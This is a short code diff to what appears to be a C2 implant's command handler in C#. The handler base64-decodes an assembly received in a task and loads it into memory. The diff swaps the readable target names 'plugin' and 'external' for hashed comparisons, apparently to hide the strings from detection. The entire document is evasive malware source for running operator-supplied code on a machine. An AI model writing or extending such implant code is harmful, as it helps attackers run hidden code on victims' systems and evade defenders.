@@ -40,11 +40,12 @@ namespace Athena.Commands
             LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
             try
             {
-                if(la.target == "plugin")
+
+                if(la.target.IsEqualTo("A24BCF2198B1B13AD985304483F7F324")) //plugin
                 {
                     this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                 }
-                else if(la.target == "external")
+                else if (la.target.IsEqualTo("6A21B6995A068148BBB65C8F949B3FB2")) //external
                 {
                     this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                 }
